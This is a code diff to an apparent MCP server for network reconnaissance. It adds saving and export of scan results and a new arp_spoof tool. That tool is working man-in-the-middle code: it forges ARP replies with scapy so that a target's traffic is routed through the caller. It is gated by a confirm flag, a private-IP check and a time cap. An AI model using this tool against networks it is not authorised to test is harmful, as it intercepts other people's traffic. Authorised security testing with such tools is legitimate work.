@@ -169,6 +169,19 @@ def _tcp_connect_scan(ip, port, timeout=1):
         return False
 
 
+# ── Auto-save helper ──
+
+
+def _auto_save(tool_name: str, result: str, metadata: dict | None = None) -> str:
+    """Save a scan result and append the result ID to the output."""
+    try:
+        from ursa_minor.results import save_result
+        result_id = save_result(tool_name, result, metadata)
+        return result + f"\n\n[Saved as {result_id}]"
+    except Exception:
+        return result
+
+
 # ── MCP Tools ──
 
 
@@ -226,7 +239,8 @@ def discover_network(target_range: str | None = None, timeout: int = 3) -> str:
             notes = "<-- likely gateway"
         lines.append(f"{d['ip']:<18} {d['mac']:<20} {d['vendor']:<15} {notes}")
 
-    return "\n".join(lines)
+    result = "\n".join(lines)
+    return _auto_save("discover_network", result, {"target_range": target_range})
 
 
 @mcp_server.tool()
@@ -313,7 +327,8 @@ def scan_ports(
             lines.append(f"{p['port']:<8} {p['service']:<15} {p['banner']}")
         lines.append(f"\n{len(open_ports)} open ports found")
 
-    return "\n".join(lines)
+    result = "\n".join(lines)
+    return _auto_save("scan_ports", result, {"target": target, "ports_scanned": len(port_list)})
 
 
 @mcp_server.tool()
@@ -544,7 +559,8 @@ def full_recon(
 
     lines.append(f"Total: {len(devices)} hosts, {total_open} open ports")
 
-    return "\n".join(lines)
+    result = "\n".join(lines)
+    return _auto_save("full_recon", result, {"target_range": target_range, "hosts": len(devices), "open_ports": total_open})
 
 
 @mcp_server.tool()
@@ -1349,7 +1365,8 @@ def vuln_scan(
     else:
         lines.append("No vulnerabilities detected.")
 
-    return "\n".join(lines)
+    result = "\n".join(lines)
+    return _auto_save("vuln_scan", result, {"url": url, "tests": tests, "findings": len(all_findings)})
 
 
 # ── OS Fingerprinting ──
@@ -1743,6 +1760,317 @@ def snmp_scan(
         lines.append("Try --brute_force=true or a different community string.")
 
     return "\n".join(lines)
+
+
+# ── Scan Result Persistence ──
+
+
+from ursa_minor.results import list_results, get_result, export_json, export_csv, export_html
+
+
+@mcp_server.tool()
+def list_scan_results(
+    tool_filter: str | None = None,
+    limit: int = 50,
+) -> str:
+    """
+    List saved scan results from previous tool runs.
+
+    Args:
+        tool_filter: Filter by tool name (e.g. "scan_ports", "full_recon").
+        limit: Max results to return (default 50).
+    """
+    results = list_results(tool_filter=tool_filter, limit=limit)
+
+    if not results:
+        return "No saved scan results found."
+
+    lines = [
+        f"Saved Scan Results ({len(results)} found)",
+        "",
+        f"{'ID':<40} {'Tool':<20} {'Timestamp'}",
+        "-" * 80,
+    ]
+
+    for r in results:
+        meta = r.get("metadata", {})
+        target = meta.get("target", "")
+        lines.append(f"{r['id']:<40} {r['tool']:<20} {r['timestamp']}")
+        if target:
+            lines[-1] += f"  ({target})"
+
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def get_scan_result(result_id: str) -> str:
+    """
+    Retrieve a specific saved scan result by ID.
+
+    Args:
+        result_id: The result ID (e.g. "scan_ports_20260306_143022").
+    """
+    record = get_result(result_id)
+    if not record:
+        return f"Result '{result_id}' not found."
+
+    lines = [
+        f"Scan Result: {result_id}",
+        f"Tool: {record.get('tool', 'unknown')}",
+        f"Time: {record.get('timestamp_str', 'unknown')}",
+    ]
+
+    metadata = record.get("metadata", {})
+    if metadata:
+        lines.append("Metadata:")
+        for k, v in metadata.items():
+            lines.append(f"  {k}: {v}")
+
+    lines.append("")
+    lines.append(record.get("result", ""))
+
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def export_scan_result(
+    result_id: str,
+    format: str = "json",
+) -> str:
+    """
+    Export a saved scan result to a specific format.
+
+    Args:
+        result_id: The result ID to export.
+        format: Export format — "json", "csv", or "html".
+    """
+    format = format.lower()
+
+    if format == "json":
+        return export_json(result_id)
+    elif format == "csv":
+        return export_csv(result_id)
+    elif format == "html":
+        return export_html(result_id)
+    else:
+        return f"Unknown format '{format}'. Use: json, csv, or html."
+
+
+# ── ARP Spoof (MCP-exposed with safeguards) ──
+
+
+import ipaddress
+import threading
+
+_arp_spoof_state = {
+    "active": False,
+    "stop_event": None,
+    "thread": None,
+    "packets_sent": 0,
+}
+
+
+def _is_private_ip(ip_str: str) -> bool:
+    """Check if an IP is in a private RFC 1918 range."""
+    try:
+        addr = ipaddress.ip_address(ip_str)
+        return addr.is_private
+    except ValueError:
+        return False
+
+
+@mcp_server.tool()
+def arp_spoof(
+    target_ip: str,
+    gateway_ip: str | None = None,
+    interface: str | None = None,
+    duration: int = 60,
+    confirm: bool = False,
+) -> str:
+    """
+    Perform ARP spoofing (MITM) between a target and gateway.
+
+    IMPORTANT: This tool requires explicit confirmation. Set confirm=True
+    to proceed. Only works on private (RFC 1918) networks.
+
+    This enables IP forwarding, sends spoofed ARP replies to both target
+    and gateway, and auto-restores ARP tables when stopped or when
+    duration expires.
+
+    Args:
+        target_ip: Target IP address to intercept.
+        gateway_ip: Gateway IP (auto-detected if not specified).
+        interface: Network interface to use (auto-detected if not specified).
+        duration: Spoofing duration in seconds (default 60, max 300).
+        confirm: Must be True to proceed — safety check.
+    """
+    if not confirm:
+        return (
+            "ARP spoofing requires explicit confirmation.\n"
+            "Call with confirm=True to proceed.\n"
+            "This will intercept traffic between the target and gateway."
+        )
+
+    if _arp_spoof_state["active"]:
+        return "ARP spoof is already running. Use arp_spoof_stop() first."
+
+    if not _is_private_ip(target_ip):
+        return f"Refused: {target_ip} is not a private (RFC 1918) IP address."
+
+    # Cap duration
+    try:
+        from major.config import get_config
+        max_duration = get_config().get("minor.arp_spoof_max_duration", 300)
+    except ImportError:
+        max_duration = 300
+    duration = min(duration, max_duration)
+
+    # Auto-detect gateway
+    if not gateway_ip:
+        try:
+            import subprocess
+            result = subprocess.run(
+                ["route", "-n", "get", "default"],
+                capture_output=True, text=True, timeout=5,
+            )
+            for line in result.stdout.splitlines():
+                if "gateway" in line.lower():
+                    gateway_ip = line.split(":")[-1].strip()
+                    break
+        except Exception:
+            pass
+
+    if not gateway_ip:
+        return "Could not auto-detect gateway. Specify gateway_ip explicitly."
+
+    if not _is_private_ip(gateway_ip):
+        return f"Refused: gateway {gateway_ip} is not a private (RFC 1918) IP address."
+
+    # Resolve MACs
+    from scapy.all import getmacbyip, get_if_hwaddr, sendp
+
+    target_mac = getmacbyip(target_ip)
+    if not target_mac:
+        return f"Could not resolve MAC for target {target_ip}. Is it online?"
+
+    gateway_mac = getmacbyip(gateway_ip)
+    if not gateway_mac:
+        return f"Could not resolve MAC for gateway {gateway_ip}."
+
+    my_mac = get_if_hwaddr(interface or conf.iface)
+
+    # Enable IP forwarding
+    import sys as _sys
+    import subprocess
+    if _sys.platform == "darwin":
+        subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"], capture_output=True)
+    elif _sys.platform == "linux":
+        try:
+            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                f.write("1")
+        except PermissionError:
+            return "Cannot enable IP forwarding. Run with sudo."
+
+    stop_event = threading.Event()
+    _arp_spoof_state["active"] = True
+    _arp_spoof_state["stop_event"] = stop_event
+    _arp_spoof_state["packets_sent"] = 0
+
+    def _spoof_loop():
+        try:
+            while not stop_event.is_set():
+                # Tell target: gateway is at our MAC
+                pkt1 = Ether(dst=target_mac) / ARP(
+                    op=2, pdst=target_ip, hwdst=target_mac,
+                    psrc=gateway_ip, hwsrc=my_mac,
+                )
+                # Tell gateway: target is at our MAC
+                pkt2 = Ether(dst=gateway_mac) / ARP(
+                    op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                    psrc=target_ip, hwsrc=my_mac,
+                )
+                sendp(pkt1, verbose=False, iface=interface)
+                sendp(pkt2, verbose=False, iface=interface)
+                _arp_spoof_state["packets_sent"] += 2
+                stop_event.wait(2)  # Re-send every 2 seconds
+        finally:
+            # Restore ARP tables
+            for _ in range(5):
+                sendp(Ether(dst=target_mac) / ARP(
+                    op=2, pdst=target_ip, hwdst=target_mac,
+                    psrc=gateway_ip, hwsrc=gateway_mac,
+                ), verbose=False, iface=interface)
+                sendp(Ether(dst=gateway_mac) / ARP(
+                    op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                    psrc=target_ip, hwsrc=target_mac,
+                ), verbose=False, iface=interface)
+
+            # Disable IP forwarding
+            if _sys.platform == "darwin":
+                subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"], capture_output=True)
+            elif _sys.platform == "linux":
+                try:
+                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                        f.write("0")
+                except Exception:
+                    pass
+
+            _arp_spoof_state["active"] = False
+            _arp_spoof_state["thread"] = None
+
+    # Auto-stop timer
+    def _auto_stop():
+        stop_event.wait(duration)
+        if not stop_event.is_set():
+            stop_event.set()
+
+    thread = threading.Thread(target=_spoof_loop, daemon=True)
+    timer = threading.Thread(target=_auto_stop, daemon=True)
+    _arp_spoof_state["thread"] = thread
+    thread.start()
+    timer.start()
+
+    return "\n".join([
+        "ARP Spoof Started",
+        f"  Target:   {target_ip} ({target_mac})",
+        f"  Gateway:  {gateway_ip} ({gateway_mac})",
+        f"  Your MAC: {my_mac}",
+        f"  Duration: {duration}s (auto-stops)",
+        f"  Interface: {interface or conf.iface}",
+        "",
+        "Traffic between target and gateway now flows through you.",
+        "Use arp_spoof_stop() to stop early and restore ARP tables.",
+    ])
+
+
+@mcp_server.tool()
+def arp_spoof_stop() -> str:
+    """
+    Stop an active ARP spoof and restore ARP tables.
+
+    Cleanly stops the spoofing, sends correct ARP replies to
+    restore the target and gateway caches, and disables IP forwarding.
+    """
+    if not _arp_spoof_state["active"]:
+        return "No active ARP spoof to stop."
+
+    stop_event = _arp_spoof_state.get("stop_event")
+    if stop_event:
+        stop_event.set()
+
+    thread = _arp_spoof_state.get("thread")
+    if thread:
+        thread.join(timeout=10)
+
+    packets = _arp_spoof_state["packets_sent"]
+    _arp_spoof_state["packets_sent"] = 0
+
+    return "\n".join([
+        "ARP Spoof Stopped",
+        f"  Total packets sent: {packets}",
+        "  ARP tables restored",
+        "  IP forwarding disabled",
+    ])
 
 
 if __name__ == "__main__":
